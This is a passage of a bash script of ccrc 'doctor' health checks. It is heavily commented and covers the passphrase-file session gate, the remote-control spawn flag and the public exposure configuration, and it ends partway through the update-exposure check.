# re-implementing a parser in bash, and this is the same rule with more at
# stake: `readAuthSecret` enforces the format AND five parameter bounds
# (D-124/113), and a bash approximation would inevitably PASS a line the server
# refuses. That refusal is not a refused login — `buildServer` calls
# `readAuthSecret` UNCAUGHT at boot, so a garbled line is a server that does not
# start, and doctor is the one place an operator can see that coming before a
# restart does. The measurement therefore runs `deploy/gen-auth-hash.mjs
# --check`, which is the same program `ccrc passwd` writes with, importing the
# same compiled module the server boots on.
#
# NOT ONE BYTE OF THE FILE REACHES A VERDICT LINE (D-140). The helper reports a class
# and a parameter summary, never content, and this check validates even that
# summary against a strict regex before printing it — because a doctor
# transcript goes into tickets, and the plausible way to get an unparseable
# `auth.scrypt` is a misplaced copy of some OTHER secret (see the helper's own
# `--check` header for the `mail.token` case).
_check_auth() {
  # `ccrc` owns both the path and the env reader — the same guard, for the same
  # reason, that `_check_config` opens with. A table sourced by something that
  # is not `ccrc` has neither, and must say so rather than measure a default it
  # invented.
  if [ -z "${BOX_AUTH_FILE:-}" ] || [ -z "${BOX_ENV_FILE:-}" ] || [ -z "${CCRC_EXPOSURE_FILE:-}" ] \
     || ! declare -F _box_env_value >/dev/null 2>&1 \
     || ! declare -F _box_unit_env >/dev/null 2>&1 \
     || ! declare -F _box_auth_path >/dev/null 2>&1 \
     || ! declare -F _box_sessions_path >/dev/null 2>&1; then
    _dr_fail auth "ccrc's own config reader is not loaded, so neither this box's CCRC_AUTH flag nor its passphrase file was measured" \
      "this is a bug in ccrc, not a fact about your box — _check_auth reads CCRC_AUTH through _box_unit_env (BOX_ENV_FILE and CCRC_EXPOSURE_FILE) and resolves the secret's and the session store's paths through _box_auth_path and _box_sessions_path, all declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi

  # ── THE FLEET HOST HAS NO GATE TO MEASURE (D-86's evidence, reused) ────
  # The gate is the SERVER's, and `~/.ccrc/auth.scrypt` is read by nothing on
  # the fleet host. `ccrc` ships to that box too, so without this branch every
  # doctor run there would WARN that a box with no server has no passphrase,
  # and send its operator to write a file nothing will ever read. The evidence
  # is the unit files — the only thing on a box that records its role — and
  # both halves are required, exactly as `_check_config` requires them: "no
  # ccrc.service" alone is also a dev checkout, and a dev checkout DOES run a
  # server.
  if [ ! -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc.service)" ] && [ -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc-agent.service)" ]; then
    _dr_skip auth "this box's units are the fleet role's ($CCRC_UNIT_DIR has ccrc-agent.service and no ccrc.service) — the PWA's session gate belongs to the server box, and nothing here reads a passphrase file"
    return 3
  fi

  # An absent, non-regular or unreadable ccrc.env leaves the flag empty, which
  # is exactly how `server/src/config.ts` reads an absent variable: OFF. Not a
  # finding of this check's — `_check_config` above owns the file's own health
  # and has three arms for it — but the flag's PROVENANCE is named in every
  # verdict below, so a reader can tell "the file says off" from "there is no
  # file" without this check having to duplicate that check's arms.
  local flag="" where="$BOX_ENV_FILE" unmeasured=0 expnamed=0 authwhy="" authfix="" unwhy="" unfix=""
  _box_unit_env CCRC_AUTH || unmeasured=$?
  authwhy="$BUE_WHY"; authfix="$BUE_FIX"
  flag="$BUE_VAL"
  # Wave 9 R10e (D-3823): the unmeasured state has TWO causes, and its words are
  # the cause's own. rc 2 is the exposure file there and unreadable (D-3596's
  # sentences, byte-identical); rc 3 is a readable file whose line this reader
  # cannot decide, worded from the reader's own `BUE_WHY`/`BUE_FIX`; any other
  # non-zero is a reader that answered something it was never meant to.
  case "$unmeasured" in
    0) ;;
    2) unwhy="$CCRC_EXPOSURE_FILE is there and cannot be read"
       unfix="look at what is really there (ls -ld $CCRC_EXPOSURE_FILE) — then re-run: ccrc expose duckdns (or: ccrc expose byo); it rewrites the file 0600" ;;
    3) unwhy="$authwhy"
       unfix="$authfix — then re-run ccrc doctor" ;;
    *) unwhy="its env-file reader answered rc $unmeasured"
       unfix="re-run ccrc doctor; if this repeats it is a bug in ccrc — see _box_unit_env in $CCRC_HERE/ccrc" ;;
  esac
  if [ "$BUE_SRC" = "$CCRC_EXPOSURE_FILE" ]; then
    where="$CCRC_EXPOSURE_FILE (it overrides $BOX_ENV_FILE)"; expnamed=1
  elif [ "$BUE_ENV" != ok ]; then
    where="no readable $BOX_ENV_FILE"
  fi

  # ── WHICH FILE (D-143), and the case where following config is worse ────
  # The same resolver `cmd_passwd` writes through (`ccrc`'s `_box_auth_path`),
  # for the reason its header gives: a doctor that measured the DEFAULT path on
  # a box whose `ccrc.env` redirects the server would report `PASS auth` about a
  # file nothing reads — and would do it right after a `passwd` that wrote the
  # same wrong file. Measuring is riskless, so an absolute override is followed
  # and NAMED; a relative one is refused here exactly as it is there, because
  # the server resolves it against systemd's working directory and this tool
  # against the operator's, and no verdict about "the secret" is possible when
  # nothing can say which file that is.
  local secret apath_rc
  secret="$(_box_auth_path)"; apath_rc=$?
  local via=""
  case "$apath_rc" in
    0) ;;
    2) via=" (CCRC_AUTH_SECRET_PATH in $BOX_ENV_FILE redirects it here)" ;;
    *)
      _dr_fail auth "$BOX_ENV_FILE sets CCRC_AUTH_SECRET_PATH to a RELATIVE path ($secret), so nothing on this box can say which file the gate's secret is: the server resolves it against the working directory systemd gives ccrc.service, and every tool that reads it resolves it against its own" \
        "make it absolute in $BOX_ENV_FILE, or remove the line and let the box use $BOX_AUTH_FILE — then re-run doctor"
      return 1 ;;
  esac
  # `= on` and nothing else, because `config.ts:331` is `env.CCRC_AUTH === 'on'`
  # — a check laxer OR stricter than the reader it describes reports a box
  # nobody is running.
  local armed=0 gate="the gate is OFF (CCRC_AUTH is not \"on\" in $where)"
  if [ "$flag" = on ]; then
    armed=1
    gate="CCRC_AUTH=on in $where"
  fi

  local helper="$CCRC_HERE/../deploy/gen-auth-hash.mjs"
  if [ ! -f "$helper" ]; then
    _dr_fail auth "the passphrase helper is missing ($helper), so the passphrase file was never read" \
      "this is a bug in ccrc, or an install that shipped ccd/ but not deploy/ — both lanes rsync the whole tree to ~/ccrc"
    return 1
  fi
  if ! command -v node >/dev/null 2>&1; then
    # `_check_wrappers`' rule: a box with no node gets exactly one FAIL, from
    # the `node` check, and every check that NEEDED node says which one to read.
    _dr_fail auth "node is not on PATH, so the passphrase file could not be read" \
      "install Node first — see the 'node' check above"
    return 1
  fi

  # stderr is DISCARDED (`_check_wrappers`' `2>/dev/null`), and here that is a
  # containment rather than tidiness: an unexpected node error could quote the
  # file it was reading, and this check's contract is that no byte of it is
  # ever printed.
  local detail rc
  detail="$(node "$helper" --check "$secret" 2>/dev/null)"; rc=$?

  case "$rc" in
    0)
      # The helper's summary is DATA from a subprocess and lands in a line a
      # human reads on a terminal that acts on control bytes, so it is pinned
      # to a shape rather than trusted — `_box_build_fields`' rule for the
      # build stamp's fields, applied to the one string that crosses here.
      if [[ ! "$detail" =~ ^N=[0-9]+,r=[0-9]+,p=[0-9]+,gen=[0-9]+$ ]]; then
        _dr_fail auth "the passphrase helper reported a state line this check does not recognise" \
          "this is a bug in ccrc, not a fact about your box — see _check_auth in $CCRC_HERE/ccrc-doctor-checks and --check in $helper"
        return 1
      fi
      # Wave 8 item D, D-3596: a passphrase this box CAN use, but whether the
      # gate is armed was not measured — the exposure file is there, unreadable,
      # and what the service manager does with it was not measured either.
      # Neither PASS arm below is honest here.
      if [ "$unmeasured" -ne 0 ]; then
        _dr_warn auth "$secret$via holds a usable passphrase ($detail), but $unwhy, so whether logins are gated was not measured" \
          "$unfix"
        return 2
      fi
      if [ "$armed" -eq 1 ]; then
        _dr_pass auth "$gate, and $secret$via holds a usable passphrase ($detail) — logins are gated"
        return 0
      fi
      # A PASS, not a WARN, and deliberately: `CCRC_AUTH` off is the SHIPPED
      # DEFAULT and a legitimate state for a box to be in (`_check_rc`'s rule —
      # a doctor that WARNed here would be asserting a preference). The detail
      # says the gate is off so nobody reads this line as "we are protected".
      _dr_pass auth "$secret$via holds a usable passphrase ($detail), but $gate, so no request is gated yet"
      return 0 ;;
    3)
      # Wave 8 item D, D-3596: same reasoning as rc 0's — with no passphrase
      # file EITHER, whether the gate is armed (and failing shut) is the one
      # fact this box needs and the one this check cannot give it.
      if [ "$unmeasured" -ne 0 ]; then
        # This arm's own rc-2 remedy (D-3596), byte-identical; every other cause keeps `unfix`.
        [ "$unmeasured" -ne 2 ] || unfix="look at what is really there (ls -ld $CCRC_EXPOSURE_FILE) and re-run ccrc expose; if the gate is meant to be armed, run: ccrc passwd"
        _dr_warn auth "there is no passphrase file at $secret$via, and $unwhy, so whether the gate is armed (and failing shut) was not measured" \
          "$unfix"
        return 2
      fi
      if [ "$armed" -eq 1 ]; then
        _dr_fail auth "$gate and there is NO passphrase file at $secret$via — the gate is armed and failing SHUT: every route answers 401 and no login can succeed" \
          "run: ccrc passwd (no restart needed — the gate re-reads the file per request)"
        return 1
      fi
      # ── A PASS, BY OPERATOR RULING (D-139) — THE REASONING IS ABOUT WARNINGS ──
      # This shipped as a WARN (the plan's own Task 9 text) and the operator
      # overruled it: `CCRC_AUTH` off with no passphrase is the state EVERY box
      # ships in — `ccrc install` writes no passphrase, by doctrine — so a
      # mandated warning ended every clean install yellow, and a yellow that
      # every operator sees on every fresh box is a yellow they learn to skim
      # past. The warnings that matter (an ARMED gate that cannot let anyone
      # in, a file the server will not boot on) are the ones that lose by it.
      # A fresh install must exit GREEN.
      #
      # The `ccrc passwd` hint is NOT dropped — it moves into the detail as
      # NEXT-STEPS TEXT, where it costs no verdict class. This is `_check_rc`'s
      # rule reached by a different road: the state is a fact about how the box
      # is configured, and the line's job is to say so plainly enough that
      # nobody reads it as "we are protected".
      # The arming words name the file that would actually decide it (wave 8
      # item D): a box whose exposure file already overrides ccrc.env is told
      # to set the flag THERE, not in the file the unit no longer reads it
      # from.
      local arming="set CCRC_AUTH=on together with CCRC_RP_ID and CCRC_ORIGIN in $BOX_ENV_FILE and restart ccrc.service"
      [ "$expnamed" -eq 0 ] || arming="set CCRC_AUTH=on in $CCRC_EXPOSURE_FILE, which overrides $BOX_ENV_FILE, together with CCRC_RP_ID and CCRC_ORIGIN (ccrc expose writes all three), and restart ccrc.service"
      _dr_pass auth "no passphrase file at $secret$via, and $gate — the shipped default, so nothing is gated and anyone who can reach this box can drive it; to arm the gate: ccrc passwd, then $arming"
      return 0 ;;
    4)
      # BOTH ARMS ARE A FAIL, and the difference between them is tense, not
      # class: with the flag on the server is refusing to boot NOW; with it off
      # the box works and the one command that arms it is a boot refusal
      # waiting to happen. Neither is a state anyone chose, and the operator
      # action is the same — which is why the remedy is one sentence and the
      # detail is two.
      #
      # THE REMEDY IS THE `mv`, NOT A BARE `ccrc passwd` (D-138), and that is the
      # writer's contract showing through: `gen-auth-hash.mjs` REFUSES to write
      # over a file it cannot read, because the generation it carries cannot be
      # read either and inventing one would revalidate sessions instead of
      # expiring them. Printing `ccrc passwd` alone here would send an operator
      # to a command that is about to refuse.
      local when="the moment CCRC_AUTH=on is set, the server will refuse to boot on it"
      if [ "$unmeasured" -eq 2 ]; then
        when="if CCRC_AUTH is on (whether it is was not measured: $CCRC_EXPOSURE_FILE cannot be read), the server refuses to boot on it"
      elif [ "$unmeasured" -ne 0 ]; then
        # rc 3, or a reader answer this check never expected: its own cause, never an empty one.
        when="if CCRC_AUTH is on (whether it is was not measured: $unwhy), the server refuses to boot on it"
      elif [ "$armed" -eq 1 ]; then
        when="with $gate the server REFUSES TO BOOT on it — readAuthSecret is called uncaught at startup"
      fi
      # ── AND THE SESSION FILE IS RESOLVED, NOT ASSUMED (D-148) ────────────
      # This clause used to be a hard-coded `rm -f ~/.ccrc/sessions.json`,
      # printed in the same breath as a `$secret` that WAS resolved through
      # `_box_auth_path` — D-143's own defect class, one key over. On a box
      # setting `CCRC_SESSIONS_PATH` it told the operator to delete a file
      # nothing reads, leaving the sessions the fresh generation-1 secret is
      # about to revalidate exactly where they were.
      local sess sess_rc sessvia="" rmclause
      sess="$(_box_sessions_path)"; sess_rc=$?
      rmclause="rm -f $sess"
      case "$sess_rc" in
        2) sessvia=" — CCRC_SESSIONS_PATH in $BOX_ENV_FILE redirects the session file there, so that is the one to delete" ;;
        3) # No `rm` at all rather than a wrong one: relative, the server resolves
           # it against systemd's working directory and this tool against the
           # operator's, so nothing on this box can name the file. Saying so beats
           # printing a path that deletes something else.
           rmclause="rm -f <this box's session file>"
           sessvia=" — CCRC_SESSIONS_PATH in $BOX_ENV_FILE is RELATIVE, so nothing here can say which file the session store is; make it absolute (or remove the line) and re-run doctor" ;;
      esac
      _dr_fail auth "$secret$via exists and this box cannot use it (it does not parse as a scrypt secret line, or it cannot be read at all) — $when" \
        "move it aside and set a fresh one: mv $secret $secret.broken && $rmclause && ccrc passwd (ccrc passwd refuses to overwrite a file it cannot read; the fresh file restarts at generation 1, which is why the session store goes with it)$sessvia"
      return 1 ;;
    5)
      _dr_warn auth "$secret$via exists but could not be measured: this box has no server build, and the passphrase file is read by the server's own parser" \
        "build it (npm run build in server/, or re-run bash deploy/deploy.sh) — until then nothing here can tell a usable passphrase file from one that will refuse the boot"
      return 2 ;;
    *)
      _dr_fail auth "reading $secret exited $rc — this check does not know what that means" \
        "this is a bug in ccrc, not a fact about your box — see _check_auth in $CCRC_HERE/ccrc-doctor-checks"
      return 1 ;;
  esac
}

# ── what this box's sessions are SPAWNED AS ───────────────────────────────
# `~/.ccrc/remote-control` decides whether `ccd` spawns a session with
# `--remote-control` — driven over the RC socket and discoverable on claude.ai
# — or as a plain pane. It is per-box, operator-owned, and seeded once by
# whichever lane installed the box (`ccrc install` writes `off`, `deploy.sh`'s
# fleet lane writes `on`; each has its own reason, stated where it is written).
#
# THE AUTHORITY IS `ccd`'s `_rc_enabled`, not this function. There the rule is:
# first line, ALL whitespace stripped, must equal `on`; absent, unreadable,
# empty or anything else is OFF, because a garbled file must not half-enable a
# mode. `_dr_rc_state` prints what that reader would decide and why; it never
# decides anything itself, and `_check_rc` REPORTS that answer rather than
# judging it, because both values are legitimate states for a box to be in.
#
# ── A CHECK OF ITS OWN, NOT A RIDER ON `config` (fix round 1) ─────────────
# This shipped first as an append to `_check_config`'s two PASS details, and
# that made a fact about SPAWN SHAPE conditional on the health of an unrelated
# file. The readout vanished on four of that check's arms — the fleet-role SKIP
# and all three `ccrc.env` WARNs — which meant the reference FLEET HOST, the one
# box in this topology that actually runs `on`, printed nothing about RC at all:
# it has no `ccrc.env` and never will (D-86's topology branch, `_check_config`
# above). A `chmod 000 ccrc.env` did the same on a server box whose flag file
# was perfectly readable. Splitting it out is strictly SMALLER than the append —
# one table entry, one function, no coupling — and it is what puts the answer on
# the box the pointers in `ccd/ccd` and the README send operators to.
#
# THE SECOND SPELLING OF THE PATH IS DELIBERATE, and it is the trade D-92
# already records for `CCRC_UNIT_DIR` (and `_check_path`'s note about
# `WRAPPER_BIN_DIR` before it): this table is sourced under `set -u` by things
# that are NOT `ccrc` — and `ccd`, which owns the authoritative copy, never
# sources it at all — so it cannot reach either tool's variable, and a
# `${…:-…}` fallback IS the second spelling with a branch in front of it.
# `single-definition.test.ts` compares all four literals in this repository and
# goes red on a drift, which is the mechanism the promise would otherwise be.
#
# FIVE PRINTED FORMS OVER THREE SEMANTIC STATES, and the last two are why this
# is a function rather than an inline `[ -f ] && cat`:
#   - `off (default)` and a bare `off` are different facts about the box —
#     "nobody has decided" and "somebody decided no" — and an operator acts on
#     them differently: one is a file to write, the other a file to edit.
#   - `off (unparseable …)` covers the file whose first line is neither, and
#     THAT INCLUDES A NEWLINE-LESS `on`: bash's `read` returns non-zero at
#     EOF-before-delimiter, so `printf 'on' > …` reads as OFF. Printing a bare
#     `off` for it would tell an operator they had chosen the mode their edit
#     never reached. The reader stays strict (that direction is fail-safe);
#     the surprise is paid for here, at the reporting layer, which is the right
#     place for it.
#   - `off (unreadable …)` is split off from unparseable because a mode problem
#     and a bytes problem are two different mornings, and telling somebody to
#     fix bytes that were never the problem is this file's own overloaded-seam
#     defect. `_check_config` above draws the same line for `ccrc.env` (its
#     `[ ! -f ]` and `[ ! -r ]` arms) — this is a coarser echo of that
#     precedent, not a copy of it: there the two conditions get two WARN arms
#     with two different remedies, here they share one always-PASS form,
#     because nothing about the flag file is a defect to remedy.
CCRC_RC_FILE="$HOME/.ccrc/remote-control"

_dr_rc_state() {
  local first="" garbled="off (unparseable — the file must hold one line reading 'on' or 'off')"
  [ -e "$CCRC_RC_FILE" ] || { printf '%s' "off (default)"; return 0; }
  # THE TWO GUARDS COME BEFORE THE READ, not after it, and that is what keeps
  # the two answers apart. A chmod-000 file and an EMPTY file both make `read`
  # fail with nothing in the variable, so a post-hoc `[ -n "$first" ]` would
  # report an empty file — which is a bytes problem with an obvious fix — as a
  # permissions problem. Asking first means everything below this point is a
  # file whose bytes really were the answer.
  if [ ! -f "$CCRC_RC_FILE" ] || [ ! -r "$CCRC_RC_FILE" ]; then
    printf '%s' "off (unreadable — it is there and nothing could be read out of it; look at what is really there)"
    return 0
  fi
  # `2>/dev/null` BEFORE the input redirect, exactly as `_rc_enabled` writes it
  # and for the reason measured there: bash applies redirections left to right,
  # so with the suppression written last a file the guards above did not catch
  # prints a raw `Permission denied` — with this file's line number,
  # unattributed — onto doctor's stderr, which this suite asserts is empty.
  #
  # A FAILED READ HERE IS EOF-BEFORE-DELIMITER, i.e. an empty file or a last
  # line with no newline. Both are unparseable in the same sense: no LINE was
  # there to read. `printf 'on' > …` is that case and is the whole reason this
  # form exists.
  IFS= read -r first 2>/dev/null < "$CCRC_RC_FILE" || { printf '%s' "$garbled"; return 0; }
  case "${first//[[:space:]]/}" in
    on)  printf '%s' "on" ;;
    off) printf '%s' "off" ;;
    *)   printf '%s' "$garbled" ;;
  esac
}

# ALWAYS PASS — this check has no WARN and no FAIL, and that is a contract
# rather than an omission. The state is a FACT about how the box is configured,
# not a defect: `on` and `off` are both correct for the boxes that chose them,
# and a doctor that WARNed on either would be asserting a preference it has no
# standing for. The two degraded forms are PASSes for the same reason and one
# more — this file's own rule is that a WARN OWES A REMEDY, and the honest
# remedy for a garbled flag file ("write `on` or `off` into it") is already the
# whole detail. Nothing here can make a healthy box exit 1.
#
# IT READS ONE FILE AND NOTHING ELSE: no `ccrc.env`, no unit files, no box role.
# That independence is the finding this check exists for, and it is what lets
# the answer appear on the fleet host.
_check_rc() {
  _dr_pass rc "$(_dr_rc_state)"
}

# ── stage 3b (spec D6): the exposure quartet ──────────────────────────────
# Four checks, one subject each, all keyed off ONE fact: does
# $CCRC_EXPOSURE_FILE exist? A box that never ran `ccrc expose` — a BYO-proxy
# box (parent spec :160-164), or a pre-3b box — is a VALID END STATE, not a
# fault, so all four SKIP there (THE FOURTH OUTCOME) and none of them nags a
# box that chose to stay dark. The four are separate checks and not one,
# because their remedies are four different operator actions (re-run the verb;
# run the root ceremony; read caddy's renewal log; look at the ddns timer) —
# joining any two is the overloaded-seam collapse `_check_wrappers` was split
# for.
#
# ── D-150, SATISFIED BY CONSTRUCTION ─────────────────────────────────────
# None of these probes crosses the armed session gate: `caddy` asks systemd,
# `name` asks the resolver, and `cert` reads only the TLS HANDSHAKE off the
# local listener (`openssl s_client` with SNI — no HTTP request is ever sent,
# so there is no 401 to classify into `_check_fleet`'s rc shape). Measuring
# the cert against 127.0.0.1:443 rather than the WAN path is the same
# discipline from the other side: the answer exists before DNS propagates and
# never depends on the router.
#
# ── THE TOKEN IS NEVER READ, LET ALONE PRINTED ───────────────────────────
# `exposure` fetches exactly two keys (CCRC_ORIGIN, CCRC_RP_ID) through
# `_box_env_value` and reports the ORIGIN; CCRC_DDNS_TOKEN is never fetched by
# any of the four (`_check_config`'s standing rule, and ccrc-doctor.test.ts
# plants a canary token that must not appear anywhere in a full run).
#
# ── THE CONSTANTS COME FROM `ccrc`, NEVER RESPELLED (D-85's rule) ─────────
# `CCRC_EXPOSURE_FILE`, `CCRC_CADDYFILE` and `CCRC_DDNS_UNIT` are each
# declared once in `ccrc` (single-definition.test.ts pins all three), and this
# file reaches them the way `_check_config` reaches `BOX_ENV_FILE`: through a
# guard that FAILs as "a bug in ccrc" when the table was sourced by something
# that is not `ccrc` — a `${…:-…}` fallback would be the second spelling with
# a branch in front of it (D-92's trade, stated at `CCRC_RC_FILE` above).

# ── exposure: the file the verb wrote, still whole and still private ──────
_check_exposure() {
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || ! declare -F _box_env_value >/dev/null 2>&1; then
    _dr_fail exposure "ccrc's own exposure-file constant is not loaded, so this box's exposure config was never read" \
      "this is a bug in ccrc, not a fact about your box — _check_exposure reads CCRC_EXPOSURE_FILE through _box_env_value, both declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ ! -e "$CCRC_EXPOSURE_FILE" ]; then
    _dr_skip exposure "not configured — no $CCRC_EXPOSURE_FILE (a BYO proxy, or a pre-3b box; both are valid end states, and 'ccrc expose' is what writes one)"
    return 3
  fi
  # `_check_config`'s split, coarser: not-a-file and unreadable are one FAIL
  # here (not two WARNs) because for THIS file either state means the server
  # unit's second EnvironmentFile line is feeding it nothing usable.
  if [ ! -f "$CCRC_EXPOSURE_FILE" ] || [ ! -r "$CCRC_EXPOSURE_FILE" ]; then
    _dr_fail exposure "$CCRC_EXPOSURE_FILE is there and cannot be read (not a regular file, or unreadable), so this box's origin was never measured" \
      "look at what is really there (ls -ld $CCRC_EXPOSURE_FILE), then re-run: ccrc expose duckdns (or: ccrc expose byo) — it rewrites the file 0600"
    return 1
  fi
  local -a gaps=()
  local mode="" modesaid=" (mode not measured — no stat on PATH)"
  # `stat` guarded exactly like `_check_wrappers`' size gate: never assumed.
  # With it absent the keys are still measured — a box missing coreutils must
  # not lose the half of this check that needs only bash.
  #
  # NO `-L` HERE, DELIBERATELY — and this is the opposite call to the one the
  # size gate makes (D-160), so it is written down rather than left to look
  # like the same oversight. That gate follows the link because it is bounding
  # a READ, and the bytes it will read are the target's. This measures whether
  # a SECRET is protected. On a symlink `stat -c%a` answers the link's own mode
  # (777), which fails this check — and failing is the right answer, because a
  # world-writable name pointing at the DuckDNS token is a finding whether or
  # not the bytes behind it happen to be 0600. Adding `-L` would make a
  # symlinked secret pass silently. A false FAIL here costs a sentence; a false
  # PASS costs the token.
  if command -v stat >/dev/null 2>&1; then
    mode="$(_plat_mode -- "$CCRC_EXPOSURE_FILE" 2>/dev/null)" || mode=""
    if [ "$mode" = 600 ]; then
      modesaid=", mode 0600"
    else
      gaps+=("its mode is ${mode:-unreadable}, not 0600 — the DuckDNS token must never be world-readable")
    fi
  fi
  local origin rpid expmode
  origin="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_ORIGIN)"
  rpid="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_RP_ID)"
  expmode="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_EXPOSE_MODE)"
  [ -n "$origin" ] || gaps+=("CCRC_ORIGIN is empty or absent")
  # No rp id is OWED on mode ip (stage 5, S10): an rpId must be a domain, so
  # `ccrc expose ip` deliberately writes none and the gate runs passphrase-
  # only — failing that box on the key its own verb refuses to write would
  # make every ip exposure permanently red.
  if [ "$expmode" != ip ]; then
    [ -n "$rpid" ] || gaps+=("CCRC_RP_ID is empty or absent")
  fi
  # ── D-167: exposed means BEHIND the proxy, and that is a bind, not a wish ─
  # Caddy proxies to 127.0.0.1:<port>. A server bound to one non-loopback
  # address answers caddy with nothing, and every public request becomes a
  # 502 while the unit sits there `active` and every other check passes.
  # Measured live 2026-08-22: a deploy shipped a ccrc.env carrying a
  # workstation's stale tailnet IP and took the public name down for 3m17s;
  # what made it expensive was that NOTHING said so. Empty is the config.ts
  # default (127.0.0.1) and the wildcards include loopback, so only a genuine
  # single-address bind elsewhere is a gap.
  #
  # Read the way SYSTEMD reads it, or the verdict is about a value nothing
  # uses: the unit carries TWO EnvironmentFile lines — ccrc.env then this
  # file — and for a key in both, the LATER file wins. Measuring only
  # ccrc.env would FAIL a box whose exposure.env corrects it, which is
  # precisely the shape an operator reaches for after being bitten once.
  local bindhost="" bindsrc=""
  if [ -n "${BOX_ENV_FILE:-}" ] && [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ]; then
    bindhost="$(_box_env_value "$BOX_ENV_FILE" CCRC_HOST)"
    [ -z "$bindhost" ] || bindsrc="$BOX_ENV_FILE"
  fi
  local expbind
  expbind="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_HOST)"
  if [ -n "$expbind" ]; then
    bindhost="$expbind"
    bindsrc="$CCRC_EXPOSURE_FILE"
  fi
  #
  # Judged only when the value is a literal ADDRESS. A hostname would have to
  # be resolved to be judged, and a check that resolved names to decide a
  # verdict would answer differently depending on the box's DNS — so a
  # hostname gets no verdict here rather than a guessed one. Nothing is lost:
  # the shape this exists to catch is an IP pasted from another box.
  case "$bindhost" in
    ''|127.0.0.1|localhost|::1|0.0.0.0|'::'|'[::]') ;;
    # dotted-quad, or anything carrying a ':' (an IPv6 literal, bracketed or
    # not) — the two spellings an address arrives in.
    [0-9]*.[0-9]*.[0-9]*.[0-9]*|*:*|'['*)
      gaps+=("$bindsrc binds the server to CCRC_HOST=$bindhost, which is not loopback and not a wildcard — caddy proxies to 127.0.0.1 and will answer every public request with 502") ;;
  esac
  if [ "${#gaps[@]}" -gt 0 ]; then
    _dr_fail exposure "$CCRC_EXPOSURE_FILE is present but $(_dr_join ${gaps[@]+"${gaps[@]}"})" \
      "re-run: ccrc expose duckdns (or: ccrc expose byo) — it rewrites $CCRC_EXPOSURE_FILE 0600 with both keys; the server reads the file as written, so a gap here is a box whose auth origin is half-set. A CCRC_HOST gap is the other file: set CCRC_HOST=127.0.0.1 in $BOX_ENV_FILE (or delete the line — that is the default) and restart: $(_dr_restart_hint ccrc.service)"
    return 1
  fi
  if [ "$expmode" = ip ]; then
    _dr_pass exposure "configured — CCRC_ORIGIN=$origin (mode ip: no rp id — passphrase login only)$modesaid"
  else
    _dr_pass exposure "configured — CCRC_ORIGIN=$origin (rp id: $rpid)$modesaid"
  fi
}

# ── update-exposure: can anyone who reaches this box move it? ─────────────
# (design 2026-09-20 §12, "the unarmed-exposure doctor check"). With CCRC_AUTH
# off every route is open to whoever reaches the port — auth/gate.ts says so in
# its own words ("there is no credential to forge with") — and the update
# routes are routes like any other. The sentences below say "the update
# routes" rather than naming one (fix round 1 item 25 / review 155 Q7): this
# check's ORIGINAL text named `POST /api/updates/apply`, wave 5's route to
# move this box, before that wave landed — measured at the time (batch E
# review fix round 1, M2: cited by symbol, never by an exhaustive list that
# a later wave would make stale), the W2 update routes registered in
# `server/src/update/routes.ts` were read-and-write ones (`GET /api/updates`,
# `POST /api/updates/intent`, `/refresh`, `/ack`) but NONE of them moves this
# box, so a box read with THIS wave's ccrc would have been told to worry
# about a route that could not be reached because it did not exist. The
# generic phrase stays true across every wave that adds a write route here,
# which naming one by name cannot.
# So this check is two measurements, and the obvious reading of each is wrong:
#
#   ARMED — CCRC_AUTH=on, read with the SERVER UNIT's precedence: ccrc.service
#     carries two EnvironmentFile lines, ccrc.env then $CCRC_EXPOSURE_FILE, and
#     for a key in both the LATER file wins, EVEN WHEN its value is empty —
#     that is what a second `EnvironmentFile=` does, not merely what a
#     non-empty override does. `ccrc expose` writes CCRC_AUTH=on into the
#     exposure file and never into ccrc.env (`_exp_env_write`, D-162), so a
#     ccrc.env-only read would call every correctly exposed box unarmed.
#     `_check_exposure`'s CCRC_HOST read above is the precedent this copies,
#     and (wave 8 item D (decision D)) it is now the ONE shared reader, `ccrc`'s
#     `_box_unit_env` — the same function `_check_auth` and install's gate
#     line read the flag through, so all three cannot disagree. PRESENCE, not
#     a non-empty value, wins (fix round 1 item 7 / review 155 C13):
#     `_box_env_value`'s own return code, which `_box_unit_env` carries
#     forward, says whether the exposure file named the key AT ALL, told
#     apart from the key printing empty because the file never mentioned it.
#     A hand-written bare `CCRC_AUTH=` line now reads here exactly as systemd
#     reads it: OFF, overriding ccrc.env=on, not "not set, fall back". `ccrc
#     expose` itself never writes that bare line — this is the hand-edited
#     case, and a doctor that folded it into "unset" was a false PASS over a
#     gate that is actually off. An exposure file that is there and cannot be
#     read is UNMEASURED, never folded into either answer — see below.
#   REACHABLE — not the bind alone, and CCRC_HOST is read through the SAME
#     `_box_unit_env` (its one other caller, D-3597's exception is
#     `_check_exposure`'s own CCRC_HOST read above, left as it was): a correctly
#     exposed box keeps CCRC_HOST at
#     its loopback default (config.ts) because Caddy on 443 proxies
#     127.0.0.1. So reachable is a non-loopback CCRC_HOST (same precedence) OR
#     any exposure artifact present — $CCRC_EXPOSURE_FILE, $CCRC_CADDYFILE, or
#     the $CCRC_DDNS_UNIT unit (.service or .timer) installed. "expose ran,
#     then the exposure file was deleted" leaves the Caddyfile: still
#     reachable, now unarmed — the case this check exists for. A HOSTNAME bind
#     counts as reachable: judging it loopback would need a resolver, and the
#     wrong answer in that direction is a false PASS.
#
# FAIL iff reachable and not armed. A fleet-role box runs no server and serves
# no update route: SKIP, on either piece of evidence the other role-aware
# checks use — ccrc.env's recorded CCRC_ROLE=fleet (D-3111's read, `-f` before
# `-r`, D-3025), or `_check_auth`'s two unit files (D-86: "no ccrc.service"
# alone is also a dev checkout, and a dev checkout DOES run a server).
#
# NOT ONE PATH OR UNIT NAME IS SPELLED HERE (D-85's rule): single-definition's
# holder scans pin `.ccrc/exposure.env`, `.ccrc/Caddyfile` and the ddns unit
# name to ccd/ccrc's declarations alone, and a message that spelled one would
# be a second holder. Every one below is a variable.
_check_update-exposure() {
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || [ -z "${CCRC_CADDYFILE:-}" ] || [ -z "${CCRC_DDNS_UNIT:-}" ] \
